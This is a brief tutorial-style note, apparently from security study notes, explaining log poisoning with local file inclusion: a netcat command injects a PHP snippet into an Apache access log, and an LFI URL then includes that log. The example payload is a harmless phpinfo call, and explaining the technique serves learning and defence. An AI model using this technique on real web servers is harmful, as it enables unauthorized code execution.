Log poisoning is a technique where an attacker injects executable code into a web server's log file and then uses an LFI vulnerability to include and execute this log file. 

**Example:**
1. An attacker sends a `netcat` request to the vulnerable machine containing a PHP code:
	```bash
	nc VICTIM_IP 80
	<?php echo phpinfo(); ?>
	```
	The code will then be logged in the server's `access logs`.

2. The attacker then uses LFI to include the access log file:
	`hxxp://IP/session.php?page=/var/log/apache2/access.log`